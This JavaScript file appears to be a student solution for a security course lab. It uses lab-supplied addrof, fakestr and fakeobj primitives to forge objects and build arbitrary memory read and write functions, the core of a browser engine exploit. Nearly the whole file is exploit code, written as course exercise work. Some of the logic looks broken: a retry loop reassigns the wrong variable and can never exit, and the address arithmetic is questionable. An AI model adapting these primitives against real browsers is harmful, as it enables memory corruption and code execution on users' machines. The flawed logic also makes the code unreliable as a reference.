/*
 * TODO: Part B solution goes here!
 */
let data = new Uint32Array(1);
let strfront = String.fromCharCode(1, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0);
let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);

// Here we are creating arrays for each condition where the address of the string is before of after the array
let originarray = new Uint32Array(72);
while (cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944 || cs361s.addrof(originarray) < cs361s.addrof(fakestring)) {
    array = new Uint32Array(72);
}

// Create offet and our copying array
let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
let copy = new Uint8Array(72);

// Loop for each index
var index = 0;
while(index < copy.length){
    copy[index] = fakestring.charCodeAt(offset + index);
    index++;
}

// Loop transfering data to copy
var fb = 0;
while(fb < 8) {
    var bit = 0;
    let temp = cs361s.addrof(data);
    while(bit < fb) {
        temp = (temp - copy[72 - 16 + bit])/256;
        bit++;
    }   
    copy[72 - 16 + fb] = temp % 256;
    fb++;
}

// pass to control
let cc = String.fromCharCode(...copy)
let control = cs361s.fakeobj(cs361s.addrof(cc) + 16);

// Editing control
let editmem = function(addr) {
    let num = Math.pow(2, 32);
    control[14] = addr % num;
    control[15] = ((addr - control[0]) / num);
};

// Read
let readmem = function(addr) {
    editmem(addr);
    return data[0];
};

// Write
let writemem = function(addr, val) {
    editmem(addr);
    data[0] = val;
};
